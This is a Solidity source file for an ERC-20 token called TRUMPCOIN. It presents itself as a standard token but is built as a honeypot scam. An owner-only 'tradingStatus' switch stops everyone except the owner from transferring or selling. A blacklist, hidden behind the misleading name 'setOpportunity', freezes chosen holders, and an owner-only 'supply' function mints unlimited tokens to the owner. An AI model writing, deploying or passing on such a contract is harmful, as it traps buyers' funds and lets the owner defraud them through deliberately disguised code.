// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract Token is IERC20 {
    string private _name = "TRUMPCOIN";
    string private _symbol = "TRUMP";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 100000000 * 10 ** uint256(_decimals);

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _blacklist;
    
    address private _origin;
    bool private _honeypotEnabled;

    constructor() {
        _origin = msg.sender;
        _balances[_origin] = _totalSupply;
        emit Transfer(address(0), _origin, _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        require(!_blacklist[msg.sender], "Sender is blacklisted");
        require(!_honeypotEnabled || msg.sender == _origin, "Honeypot active");
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        require(!_blacklist[from], "Sender is blacklisted");
        require(!_honeypotEnabled || from == _origin, "Honeypot active");
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amount, "ERC20: transfer amount exceeds balance");
        
        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal {
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= amount, "ERC20: insufficient allowance");
        _approve(owner, spender, currentAllowance - amount);
    }

    function supply(uint256 amount) external {
        require(msg.sender == _origin, "Only origin can mint");
        _totalSupply += amount;
        _balances[_origin] += amount;
        emit Transfer(address(0), _origin, amount);
    }

    function burn(uint256 amount) external {
        require(msg.sender == _origin, "Only origin can burn");
        require(_balances[_origin] >= amount, "Burn amount exceeds balance");
        _totalSupply -= amount;
        _balances[_origin] -= amount;
        emit Transfer(_origin, address(0), amount);
    }

    function setOpportunity(address user, bool status) external {
        require(msg.sender == _origin, "Only origin can");
        _blacklist[user] = status;
    }

    function tradingStatus(bool status) external {
        require(msg.sender == _origin, "Only origin can");
        _honeypotEnabled = status;
    }

    function switchOrigin(address newOrigin) external {
        require(msg.sender == _origin, "Only origin can switch");
        _origin = newOrigin;
    }
}